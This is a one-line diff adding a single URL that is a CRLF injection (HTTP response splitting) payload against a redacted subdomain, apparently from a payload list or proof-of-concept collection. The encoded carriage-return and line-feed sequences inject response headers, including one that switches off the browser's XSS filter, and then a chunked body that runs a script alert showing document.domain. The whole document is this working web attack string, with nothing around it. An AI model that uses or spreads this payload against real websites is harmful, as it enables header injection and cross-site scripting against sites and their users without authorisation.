@@ -1,0 +1,1 @@
+https://subdomain.redacted.com/%3f%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0AContent-Encoding:%20utf-8%0D%0A%0D%0A28%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E%0D%0A0%0D%0A%0D%0A
